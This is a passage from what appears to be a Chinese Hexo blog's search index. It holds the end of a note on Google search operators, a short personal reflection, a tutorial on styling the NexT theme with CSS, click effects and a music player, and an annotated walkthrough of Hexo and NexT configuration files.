（搜索所有以关键词为后缀的文件的url） ext:关键词 （性质与filetype一致）info: 搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用inurl:关键词 （搜索url中包含关键词的网页）allinurl:关键词,关键词 （搜索url中包含多个关键词的网页）site:url （将搜索范围缩小到特定的网站，域或子域）*（通配符）-（排除符号）]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[世界上最不能等待的事]]></title>
    <url>%2Farchives%2F595705f9.html</url>
    <content type="text"><![CDATA[世界上最不能等待的事不是不想不愿，只是没发现。今天晚上看了网易云音乐上面的《世界上最不能等待的事》MV，世界上有许许多多不能等待的事：工作、生活、友情、爱情、亲情等等。每个人不能把所有的方方面面都考虑到，像我这种处女座任何事情都想考虑的全面、具体。希望所有不能等待的事都能早早的去实现！]]></content>
      <categories>
        <category>诗和远方</category>
        <category>远方</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Blog美化]]></title>
    <url>%2Farchives%2F11804e57.html</url>
    <content type="text"><![CDATA[本篇文章记录nexT主题的美化工作。效果图呈现：前言通过Blog更新&配置文件详解的内容基本能满足大部分的需求，如果想要逼格高一点、深度优化，可以对里面的一些文件（swig、js等）进行新增、修改等。美化点击特效点击特效可通过JS来实现，大家可以选择自己喜欢的特效，调用JS即可。我选择的是点击桃心特效，js源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566(function(window,document,undefined)&#123; var hearts = []; window.requestAnimationFrame = (function()&#123; return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback)&#123; setTimeout(callback,1000/60); &#125; &#125;)(); init(); function init()&#123; css(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"); attachEvent(); gameloop(); &#125; function gameloop()&#123; for(var i=0;i&lt;hearts.length;i++)&#123; if(hearts[i].alpha &lt;=0)&#123; document.body.removeChild(hearts[i].el); hearts.splice(i,1); continue; &#125; hearts[i].y--; hearts[i].scale += 0.004; hearts[i].alpha -= 0.013; hearts[i].el.style.cssText = "left:"+hearts[i].x+"px;top:"+hearts[i].y+"px;opacity:"+hearts[i].alpha+";transform:scale("+hearts[i].scale+","+hearts[i].scale+") rotate(45deg);background:"+hearts[i].color; &#125; requestAnimationFrame(gameloop); &#125; function attachEvent()&#123; var old = typeof window.onclick==="function" &amp;&amp; window.onclick; window.onclick = function(event)&#123; old &amp;&amp; old(); createHeart(event); &#125; &#125; function createHeart(event)&#123; var d = document.createElement("div"); d.className = "heart"; hearts.push(&#123; el : d, x : event.clientX - 5, y : event.clientY - 5, scale : 1, alpha : 1, color : randomColor() &#125;); document.body.appendChild(d); &#125; function css(css)&#123; var style = document.createElement("style"); style.type="text/css"; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText = css; &#125; document.getElementsByTagName('head')[0].appendChild(style); &#125; function randomColor()&#123; return "rgb("+(~~(Math.random()*255))+","+(~~(Math.random()*255))+","+(~~(Math.random()*255))+")"; &#125;&#125;)(window,document);将上面源码存放为click.js文件内，将click.js文件放在/hexo/themes/next/source/js/src\路径下。打开 /hexo/themes/next/layout/_layout.swig 文件， 在head标签内最后位置添加以下代码：1&lt;script type="text/javascript" src="/js/src/click.js"&gt;&lt;/script&gt;修改文章内链接文本样式修改文件/themes/next/source/css/_common/components/post/post.styl，在末尾添加如下css样式：12345678910.post-body p a&#123; color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover &#123; color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; &#125;&#125;文章底部标签样式修改模板/hexo/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成或者可以从这里自己挑。1&lt;a href="&#123;&#123; url_for(tag.path) &#125;&#125;" rel="tag"&gt;&lt;i class="fa fa-tag"&gt;&lt;/i&gt;&#123;&#123; tag.name &#125;&#125;&lt;/a&gt;文章末尾添加结束标记在路径/hexo/themes/next/layout/_macro/中新建 passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-heart-o" aria-hidden="true"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt;接着打开/hexo/themes/next/layout/_macro/post.swig文件，post-footer之前添加如下代码（post-footer之前两个DIV）：12345678910111213141516171819&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; &#123;% if (theme.alipay or theme.wechatpay or theme.bitcoin) and not is_index %&#125; &lt;div&gt; &#123;% include 'reward.swig' %&#125; &lt;/div&gt; &#123;% endif %&#125; &#123;% if theme.post_copyright.enable and not is_index %&#125; &lt;div&gt; &#123;% include 'post-copyright.swig' with &#123; post: post &#125; %&#125; &lt;/div&gt; &#123;% endif %&#125; &lt;footer class="post-footer"&gt;打开主题配置文件/hexo/themes/next/_config.yml,在末尾添加：123# 文章末尾添加结束标记passage_end_tag: enabled: true侧边栏作者头像修改把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果，修改/hexo/themes/next/source/css/_common/components/sidebar/sidebar-author.styl:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ -webkit-animation: play 2s ease-out 1s 1; -moz-animation: play 2s ease-out 1s 1; animation: play 2s ease-out 1s 1; /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.5s ease-out; -moz-transition: -moz-transform 1.5s ease-out; transition: transform 1.5s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125;.site-author-name &#123; margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight;&#125;.site-description &#123; margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color;&#125;背景&amp;透明度美化背景图片在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567body&#123; background:url(图片链接); background-size:cover; background-repeat:no-repeat; background-attachment:fixed; background-position:center; &#125;文字背景色设置在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：12345.content &#123; border-radius: 10px; margin-top: 60px; background:rgba(颜色rgb,透明度) none repeat scroll !important; &#125;代码块美化这块工作让我头痛了很久！！！代码块透明度设置，在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:12345678910111213141516171819202122232425262728// 单行代码块设置code &#123; background:rgba(241,241,241,0.3); margin: 2px;&#125;// 多行代码块的自定义样式.highlight&#123; background:rgba(241,241,241,0.3);&#125;.highlight, pre &#123; margin: 5px 0; padding: 5px; border-radius: 3px; background:rgba(241,241,241,0.3);&#125;.highlight, td&#123; background:rgba(241,241,241,0.1)&#125;.highlight, gutter pre&#123; background:rgba(241,241,241,0.1)&#125;.highlight, code, pre &#123; border: 1px solid #d6d6d6; background:rgba(241,241,241,0.3)&#125;table&gt;tbody&gt;tr:nth-of-type(odd)&#123; background:rgba(241,241,241,0.1)&#125;注释/hexo/themes/next/source/css/_components/highlight/highlight.styl文件第81、88行：1// background-color: $highlight-gutter.bg-color这一块修改学习到了一个小技巧，通过chrome的F12→Elements→Styles进行一层层修改测试，快速找到需要修改的地方。Ps：这里要谢谢我的同事-C！播放器安装APlayer插件安装Aplayer播放器，在/hexo目录执行npm install aplayer --save。安装完后在node_modules目录下找到APlayer.min.js文件，将其复制到theme/next/source/js/src/目录下。在你想要加入音乐播放器的地方插入以下代码，这里我把它放到了侧边栏。打开theme/next/layout/_custom/文件夹下的sidebar.swig文件，向其中添加以下代码：1234567891011121314151617181920212223242526272829303132333435363738&lt;div id="player1" class="aplayer" data-id="2058781355" data-server="netease" data-type="playlist" data-mode="circulation"&gt;&lt;/div&gt;&lt;script src="/js/src/APlayer.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var ap = new APlayer(&#123; element: document.getElementById('player1'), // Optional, player element narrow: false, // Optional, narrow style autoplay: true, // Optional, autoplay song(s), not supported by mobile browsers showlrc: 3, // Optional, show lrc, can be 0, 1, 2, see: ###With lrc mutex: true, // Optional, pause other players when this player playing theme: '#e6d0b2', // Optional, theme color, default: #b7daff mode: 'circulation', // Optional, play mode, can be `random` `single` `circulation`(loop) `order`(no loop), default: `circulation` preload: 'metadata', // Optional, the way to load music, can be 'none' 'metadata' 'auto', default: 'auto' listmaxheight: '513px', // Optional, max height of play list music: [ &#123; title: '化身孤岛的鲸', // Required, music title author: '不才', // Required, music author url: '/music/不才 - 化身孤岛的鲸.mp3', // Required, music url pic: '/music/不才 - 化身孤岛的鲸.jpg', // Optional, music picture lrc: '/music/不才 - 化身孤岛的鲸.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '我的一个道姑朋友', // Required, music title author: '以冬', // Required, music author url: '/music/以冬 - 我的一个道姑朋友.mp3', // Required, music url pic: '/music/以冬 - 我的一个道姑朋友.jpg', // Optional, music picture lrc: '/music/以冬 - 我的一个道姑朋友.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '七月上', // Required, music title author: 'Jam', // Required, music author url: '/music/Jam - 七月上.mp3', // Required, music url pic: '/music/Jam - 七月上.jpg', // Optional, music picture lrc: '/music/Jam - 七月上.lrc' // Optional, lrc, see: ###With lrc &#125; ]&#125;);&lt;/script&gt;自定义播放器样式包含颜色更改，列表歌曲信息的排版修改。在/hexo/theme/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567891011121314151617181920// 播放器设置.aplayer-list&#123; height: 100px !important;&#125;.aplayer-list ol li:hover &#123; /*列表悬停颜色*/ background:rgba(255,255,255,0.3) none repeat scroll !important;&#125;.aplayer-list ol li &#123; /*列表底色*/ background:rgba(250,252,123,0.3);&#125;.aplayer-list-light &#123; /*列表播放歌曲颜色*/ background:rgba(97,217,101,0.3) none repeat scroll !important;&#125;#player1 &#123; /*边框样式*/ border-radius: 6px; div,ol &#123;border-radius: 6px;&#125; &#125;#player1 *&#123;color: #696969;&#125; /*字体颜色*//*列表歌曲信息的排版*/.aplayer-list-index&#123;float:left;&#125;.aplayer-list-title&#123;float:left;&#125;.aplayer-list-author&#123;float:right;&#125;音乐播放控制边栏将APlayer-Controler放入/hexo/themes/next/source/js/src/目录下。在/hexo/themes/next/layout/_custom/文件夹下新建一个myapcontroler.swig的文件。向其中添加以下代码：1234567891011121314151617181920212223242526&lt;script src="/js/src/APlayer-Controler.js"&gt;&lt;/script&gt;&lt;div id="AP-controler"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var myapc=new APlayer_Controler(&#123; APC_dom:$('#AP-controler'), aplayer:ap, //此为绑定的aplayer对象 attach_right:true, position:&#123;top:'300px',bottom:''&#125;, fixed:true, btn_width:100, btn_height:120, img_src:['http://oty1v077k.bkt.clouddn.com/bukagirl.jpg', 'http://oty1v077k.bkt.clouddn.com/jumpgirl.jpg', 'http://oty1v077k.bkt.clouddn.com/pentigirl.jpg', 'http://oty1v077k.bkt.clouddn.com/%E8%90%8C1.gif'], img_style:&#123;repeat:'no-repeat',position:'center',size:'contain'&#125;, ctrls_color:'rgba(173,255,47,0.8)', ctrls_hover_color:'rgba(255,140,0,0.7)', tips_on:true, tips_width:140, tips_height:25, tips_color:'rgba(255,255,255,0.6)', tips_content:&#123;&#125;, timeout:30 &#125;);&lt;/script&gt;在/hexo/themes/next/layout文件夹下打开_layout.swig文件，在前添加以下代码：1&#123;% include '_custom/myapcontroler.swig' %&#125;侧边栏美化在/hexo/themes/next/layout/_macro文件夹下打开sidebar.swig文件，找到以下代码行的位置：1&lt;nav class="site-state motion-element"&gt;在上面添加以下代码：123456789101112&lt;!--my custom code begin--&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; $("#sidebar").hover(function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 1&#125;); &#125;,function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 0&#125;); &#125;);&lt;/script&gt;&lt;div id="mydivshow" class="mydivshow"&gt;&lt;!--my custom code end--&gt;然后找到代码行：1234&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt;&lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt;在此的上方添加一个，如下所示：12345678&lt;!--my custom code begin--&gt;&lt;/div&gt;&lt;!--my custom code end--&gt;&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt; &lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt; &lt;div class="post-toc"&gt;首页隐藏文章修改next主题文件夹下的layout中的index.swig文件，将1post_template.render(post, true)修改成:123&#123;% if post.visible !=='hide' %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125;&#123;% endif %&#125;在Front-matter添加visible字段即可，当visible字段为hide时会在首页隐藏文章。1visible: hide版权透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:1234// 版权样式设置.post-copyright&#123; background:rgba(241,241,241,0.1)&#125;标签透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:123456// 标签样式设置.posts-expand .post-tags&#123; a &#123; background:rgba(241,241,241,0.1) &#125;&#125;总结自己搞不定，资料查不出来的情况下，问问其他人有时候会有意想不到的效果；CSS可以通过 !important来设置优先级；nexT的样式建议不去修改源码，通过修改/hexo/themes/next/source/css/_custom/custom.styl文件即可；根据最近的一顿操作，发现了hexo目录结构。特此记录，Ps：不建议修改源码样式，虽然我自己改了很多~~手动捂脸：路径文件名作用/hexo/themes/next/source/css/_customcustom.styl可用于自定义配置样式：.content、.sidebar、.header等/hexo/themes/next/source/css/_common/components/highlighthighlight.styl代码样式设置/hexo/themes/next/layout_layout.swig主布局文件/hexo/themes/next/layoutindex.swig首页布局文件/hexo/themes/next/layout···XX布局文件/hexo/themes/next/layout/partialsfooter.swig页脚布局（不确定）/hexo/themes/next/layout/_customNull存放自定义布局文件/hexo/themes/next/layout/_macroAll存放宏，用于博客生成结语这次美化没有完全彻底，可以看到还有一部分样式怪怪的。以后有时间，慢慢优化！！CSS太难了！！！太晚了，洗洗睡咯。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blog更新&配置文件详解]]></title>
    <url>%2Farchives%2Fd6a90b9.html</url>
    <content type="text"><![CDATA[最近博客的CSS被我玩坏了，顺带就对博客进行整体更新，并且对hexo、nexT的配置文件进行详细的记录。Ps：每篇文章还弄了摘要格式！好累~~下一篇会写nexT主题的自定义优化。由于使用hexo-neat插件压缩有问题，然后改用gulp进行压缩。发现来来回回都会有问题，并且提交到GitHub上之后，导致博客的CSS都出问题无法显示。发现nexT主题更新到6.0+，在GitHub上面的路径也换了，最终决定重新搭建博客。准备软件、环境这些可以参考博客搭建这篇文章搭建博客。使用hexo init本地新建一个博客之后，下载最新的next主题。12$ cd hexo$ git clone https://github.com/theme-next/hexo-theme-next themes/next配置以前写的文章对Hexo、nexT的配置文件没有进行详细的说明，这次搭建的时候发现有点头痛！因此，这次准备把所用到的各个字段都进行记录，便于以后出现意外情况再次重建。Hexo配置Hexo的配置为hexo根目录下的_config.yml文件。Site配置用于配置站点的主要属性。1234567# Sitetitle: #站点主标题subtitle: #站点副标题description: #站点描述author: #站点作者language: #站点语言timezone: #站点时区Url配置用于配置Url请求时的主要属性。Url这块我进行了优化，安装了hexo-abbrlink插件：让文章链接唯一化。在hexo根目录下执行$ npm install hexo-abbrlink --save123456789101112131415161718# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: #站点urlenforce_ssl: #强制使用sslroot: #站点目录permalink: archives/:abbrlink.html #站点链接设置abbrlink: #abbrlink设置 alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hex ## crc16 &amp; hex ## https://iassas.com/posts/66c8.html ## crc16 &amp; dec ## https://iassas.com/posts/65535.html ## crc32 &amp; hex ## https://iassas.com/posts/8ddf18fb.html ## crc32 &amp; dec ## https://iassas.com/posts/1690090958.htmlpermalink_defaults:Directory配置用于配置站点目录的主要属性。该部分的配置不需要修改。123456789# Directorysource_dir: source #资源文件夹，这个文件夹用来存放内容public_dir: public #公共文件夹，这个文件夹用于存放生成的站点文件tag_dir: tags #标签文件夹archive_dir: archives #归档文件夹category_dir: categories #分类文件夹code_dir: downloads/code #Include code 文件夹i18n_dir: :lang #国际化（i18n）文件夹skip_render: #跳过指定文件的渲染，您可使用 glob 表达式来匹配路径Writing配置用于配置写作时的主要属性。该部分的配置不需要修改。123456789101112131415# Writingnew_post_name: :title.md #新文章的文件名称default_layout: post #预设布局titlecase: false #把标题转换为 title caseexternal_link: true #在新标签中打开链接filename_case: 0 #把文件名称转换为 (1) 小写或 (2) 大写render_drafts: false #显示草稿post_asset_folder: false #启动 Asset 文件夹relative_link: false #把链接改为与根目录的相对位址future: true #显示未来的文章highlight: #代码块的设置 enable: true line_number: true auto_detect: true tab_replace:Home page配置用于配置主页的主要属性。12345678910111213141516# Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: #主页索引 path: '' per_page: 5 order_by: -datearchive_generator: #档案索引 per_page: 20 yearly: true monthly: truetag_generator: #标签索引 per_page: 10Category &amp; Tag配置用于配置分类、标签的主要属性。1234# Category &amp; Tagdefault_category: uncategorized #默认分类category_map: #分类别名tag_map: #标签别名Date配置用于配置日期的主要属性。该部分的配置不需要修改。123456# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD #日期格式time_format: HH:mm:ss #时间格式Pagination配置用于配置分页的主要属性。1234# Pagination## Set per_page to 0 to disable paginationper_page: 10 #每页显示的文章量 (0 = 关闭分页功能)pagination_dir: page #分页目录Extensions配置用于扩展的主要属性。plugin我加了hexo-generator-feed（用来生成RSS），theme我选择用next。123456# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/plugin: - hexo-generator-feedtheme: nextDeployment配置用于配置部署的主要属性。我就选择部署到GitHub，还支持Heroku、Rsync、OpenShift、FTPSync等。可以参考官网说明。部署到GitHub需要安装hexo-deployer-git插件，在hexo根目录下执行$ npm install hexo-deployer-git --save。123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/youname/youname.github.io.git branch: mastersearch配置用于配置搜索的主要属性。启用搜索需要安装hexo-generator-search、hexo-generator-searchdb插件，在hexo根目录下执行12$ npm install hexo-generator-search --save$ npm install hexo-generator-searchdb --save安装完之后还需要在nexT主题里面进行配置。后续会说到如何配置，稳住。12345search: path: search.xml field: post format: html limit: 10000feed配置用于配置RSS。RSS和ATOM的区别，可以参考这里。123456feed: type: atom #atom/rss2 path: atom.xml #feed路径 limit: 10 #最大帖子数 hub: content: #true/false 是否将整个页面包含进去hexo-neat配置用于博客压缩，加快访问速度。启用压缩需要安装hexo-neat，在hexo根目录下执行$ npm install hexo-neat --save12345678910111213141516# hexo-neat 静态资源压缩neat_enable: true neat_html: enable: true exclude: neat_css: enable: false exclude: - '*.min.css'neat_js: enable: true mangle: true output: compress: exclude: - '*.min.js'hexo-encypt配置用于文章加密。启用文章加密需要安装hexo-blog-encrypt，在hexo根目录下执行$ npm install hexo-blog-encrypt --save123# 文章加密功能encrypt: enable: true启用加密功能需要在文章的Front-matter部分添加password字段即可。建议修改post.md模版，目录为hexo\scaffolds\。123456789---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags: categories: password: #文章密码abstract: #文章摘要message: #密码提示---hexo-autonofollowp配置用于外部链接优化，主要作用：防止不可信的内容，最常见的是博客上的垃圾留言与评论中为了获取外链的垃圾链接，为了防止页面指向一些拉圾页面和站点。付费链接：为了防止付费链接影响Google的搜索结果排名，Google建议使用nofollow属性。引导爬虫抓取有效的页面：避免爬虫抓取一些无意义的页面，影响爬虫抓取的效率。其主要方法是给所有外部链接加上rel=”external nofollow”属性，对外部链接target=”_blank”采用在新窗口种打开外部链接的方法。启用该功能需要安装hexo-autonofollowp，在hexo根目录下执行$ npm install hexo-autonofollowp --save12345# 外部链接优化nofollow: enable: true exclude: # 例外的链接，可将友情链接放置此处 - 'yousite'sitemap配置用于站点地图配置，主要用于SEO优化。启用该功能需要安装hexo-generator-sitemap、hexo-generator-baidu-sitemap，在hexo根目录下执行12$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save配置如下12345# hexo sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xmlsymblos_count_time配置用于站点字数、阅读时间统计等。启用该功能需要安装hexo-symbols-count-time，在hexo根目录和next主题目录下执行$ npm install hexo-symbols-count-time --save。注意这里我是两个地方都执行。12345symbols_count_time: symbols: true time: true total_symbols: true total_time: truelive2d配置用于站点’吉祥物’设置，作用应该是美化站点吧。手动/斜眼笑！想要吉祥物的话需要先安装hexo-helper-live2d，在hexo根目录下执行$ npm install hexo-helper-live2d --save。接下来修改next主题目录的_layout.swig文件，路径为hexo\themes\next\layout\。在合适的地方给它安个家，要在body标签之间，例如1&lt;body&gt;&#123;&#123; live2d() &#125;&#125;&lt;/body&gt;也可以看看喜欢什么吉祥物。12345live2d: model: z16 bottom: -30 mobileShow: true mobileScaling: 0.5lazyload配置用于图片快速加载设置。启用该功能需要安装hexo-lazyload-image，在hexo根目录在执行$ npm install hexo-lazyload-image --save1234lazyload: enable: true onlypost: false loadingImg: # eg. ./images/loading.pngnexT配置nexT的配置文件为next目录下的_config.yml文件，路径为hexo\themes\next_config.yml。由于nexT的配置较多，就记录修改或者启用的地方。配置文件中所填写的目录路径皆为/source目录下，例如修改图标来源将参数值设置成/images/favicon.ico的话，表示来源为hexo\themes\next\source\images\favicon.ico。favicon设置用于图标设置，效果显示在站点标签页的地方。1234567favicon: small: /images/favicon-16x16-next.ico medium: /images/favicon-32x32-next.ico apple_touch_icon: /images/apple-touch-icon-next.png #safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xmlkeyword设置用于关键字设置。1keywords: "keyword1, keyword2, keyword3"rss设置用于rss设置，结合hexo中的设置。1rss: /atom.xmlfooter设置用于页脚设置，nexT6.0可以在配置文件中设置页脚。以前用5.X的时候，需要自己手工去修改。所以及时更新很重要哦。12345678910111213141516171819202122footer: # Specify the date when the site was setup. # If not defined, current year will be used. since: #网站建立日期 # Icon between year and copyright info. icon: heart #年份和版权之间的图标 # If not defined, will be used `author` from Hexo main config. copyright: Hywell #版权 # ------------------------------------------------------------- # Hexo link (Powered by Hexo). powered: false theme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: false # ------------------------------------------------------------- # Any custom text can be defined here. custom_text: #输入自定义文本SEO设置用于seo优化设置。123canonical: trueseo: trueindex_with_subtitle: trueMenu设置用于导航栏设置。这里的顺序会影响导航栏上显示布局的顺序。12345678910menu: home: / || home categories: /categories/ || th archives: /archives/ || archive tags: /tags/ || tags about: /about/ || usermenu_settings: icons: true badges: false #设置为true会显示具体的数值Schemes设置用于样式设置。我采用了Mist样式。1scheme: MistSidebar设置用于侧边栏设置。12345678910111213141516171819202122232425262728293031323334site_state: true #显示文章、分类、标签social: #友情链接设置 Key: permalink || icon GitHub: https://github.com/hywell || githubsocial_icons: #社交图标 enable: true icons_only: false transition: truegithub_banner: https://github.com/hywell || Follow me on GitHub # 用于设置右上角GitHub横幅。# 友情链接设置links_icon: linklinks_title: 友情链接links_layout: block#links_layout: inlinelinks: keyword: link# 侧边栏头像设置avatar: /images/avatar.png# 侧边栏目录显示toc: enable: true number: true wrap: true# 侧边栏设置sidebar: position: left #位置 display: post #显示设置 scrollpercent: true #滚动百分比 onmobile: true #窄视图启用侧边栏POST设置用于发布设置。12345678910111213141516171819202122232425262728293031323334353637scroll_to_more: true #如果文章有摘要（&lt;!-- more --&gt;），会自动滚动到摘要下面。save_scroll: true #通过cookies来缓存阅读进度excerpt_description: true #自动摘录描述作为序言auto_excerpt: #自动摘录，如果不设置&lt;!-- more --&gt;的话，可以用这个来控制 enable: true length: 150post_meta: #发布元设置 item_text: true created_at: true updated_at: true categories: truesymbols_count_time: #字数与阅读时间统计设置 需安装hexo-symbols-count-time separated_meta: true item_text_post: true item_text_total: true awl: 25 wpm: 50# Wechat Subscriber #微信二维码设置wechat_subscriber: enabled: true qcode: /images/Wechat.jpg description: 描述文字# Reward #打赏设置reward_comment: 打赏commentwechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png# Declare license on posts #文章license设置post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/Code Highlight theme设置用于代码主题设置。1highlight_theme: normalneedmoreshare2设置用于分享设置。12345678910111213141516needmoreshare2: enable: true postbottom: #文章分享 enable: true options: iconStyle: box boxForm: horizontal position: bottomCenter networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook,Evernote float: #浮动分享 enable: false options: iconStyle: box boxForm: horizontal position: middleRight networks: Weibo,Wechat,Douban,QQZone,Twitter,FacebookLocal search设置用于本地搜索，需要安装hexo-generator-searchdb。1234567local_search: enable: true # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1Reading progress bar设置用于阅读进度设置，在top显示，需要扩展theme-next-reading-progress。1234reading_progress: enable: true color: "#37c6c0" height: 2pxpace设置用于页面加载进度设置，我选用了pace-theme-loading-bar，需要扩展theme-next-pace。推荐几个我个人感觉不错的：pace-theme-center-atompace-theme-center-circlepace-theme-center-simplepace-theme-loading-bar12pace: truepace_theme: pace-theme-loading-barCanvas-nest设置用于网页背景效果设置。1canvas_nest: trueGitment设置用于页面评论系统设置，本来选用Hypercomments，在样式上设置不好看。因此，换成了Gitment。需要扩展Gitmentnpm i --save gitment。12345678910111213gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: true # Comments lazy loading with a button cleanly: false # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: user # MUST HAVE, Your Github Username github_repo: user.github.io # MUST HAVE, The name of the repo you use to store Gitment comments client_id: # MUST HAVE, Github client id for the Gitment client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled总结两个配置文件弄得我满脸懵逼！！太难了~~配置文件字段名和字段值中间需要空格;部分插件安装、配置Hexo、nexT都需进行；文章中存在特殊符号，需要使用三个单引号以代码形式，不然会报错；所有配置文件icon都可以在fontawesome选择心仪的，替换即可；]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-Pymysql中文写入]]></title>
    <url>%2Farchives%2F40673788.html</url>
